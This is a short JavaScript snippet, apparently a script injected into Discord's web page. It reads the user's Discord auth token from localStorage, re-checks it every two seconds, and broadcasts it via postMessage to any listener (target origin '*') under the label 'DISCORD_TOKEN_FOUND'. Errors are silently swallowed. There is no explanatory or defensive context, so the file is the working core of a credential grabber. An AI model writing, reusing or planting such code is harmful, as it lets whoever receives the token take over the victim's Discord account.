(function() {
  function grab() {
    try {
      let t = localStorage.getItem('token');
      if (!t) return;
      t = t.replace(/^"|"$/g, '');
      window.postMessage({ type: 'DISCORD_TOKEN_FOUND', token: t }, '*');
    } catch (e) {}
  }
  grab();
  let last = null;
  setInterval(() => {
    const t = localStorage.getItem('token');
    if (t && t !== last) {
      last = t;
      grab();
    }
  }, 2000);
})();
